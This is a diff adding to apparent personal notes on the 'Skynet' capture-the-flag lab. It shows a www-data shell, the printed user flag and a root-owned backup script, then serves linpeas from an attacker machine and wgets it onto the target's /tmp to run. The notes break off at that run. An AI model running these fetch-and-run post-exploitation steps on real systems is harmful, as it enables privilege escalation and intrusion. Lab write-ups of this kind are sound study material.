@@ -1765,5 +1765,59 @@ www-data@skynet:/home$ cd milesdyson/
 www-data@skynet:/home/milesdyson$ ls
 backups  mail  share  user.txt
 www-data@skynet:/home/milesdyson$ cat user.txt
+
+# user flag user.txt
 7ce5c2109a40f958099283600a9ae807
 www-data@skynet:/home/milesdyson$ 
+
+www-data@skynet:/home/milesdyson/backups$ ls -al
+total 4584
+drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
+drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
+-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh -> 소유자 root
+-rw-r--r-- 1 root       root       4679680 Jan  4 02:19 backup.tgz
+
+> linpeas install 
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+
+apt install lsof
+
+┌──(root㉿docker-desktop)-[/]
+└─# lsof -i :80
+COMMAND  PID USER FD   TYPE DEVICE SIZE/OFF NODE NAME
+python3 6484 root 9u  IPv4 187649      0t0  TCP *:http (LISTEN)
+
+┌──(root㉿docker-desktop)-[/]
+└─# pkill python3 -9
+
+┌──(root㉿docker-desktop)-[/]
+└─# lsof -i :80
+
+> python3 -m http.server 80
+
+> download linpeas.sh from attacker
+wget "http://192.168.144.203/linpeas.sh"
+
+> success download linpeas.sh
+md-private-79518c993c9845d1ad32e9ad377a8a0c-systemd-timesyncd.service-CRNtWy
+www-data@skynet:/tmp$ wget "http://192.168.144.203/linpeas.sh"
+--2026-01-04 02:28:05--  http://192.168.144.203/linpeas.sh
+Connecting to 192.168.144.203:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 975444 (953K) [application/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 952.58K   768KB/s    in 1.2s    
+
+2026-01-04 02:28:06 (768 KB/s) - 'linpeas.sh' saved [975444/975444]
+
+www-data@skynet:/tmp$ ls
+linpeas.sh
+systemd-private-79518c993c9845d1ad32e9ad377a8a0c-dovecot.service-hkD6M9
+systemd-private-79518c993c9845d1ad32e9ad377a8a0c-systemd-timesyncd.service-CRNtWy
+www-data@skynet:/tmp$ 
+
+> execute linpeas.sh
+www-data@skynet:/tmp$ chmod 777 linpeas.sh 
+www-data@skynet:/tmp$ ./linpeas.sh 
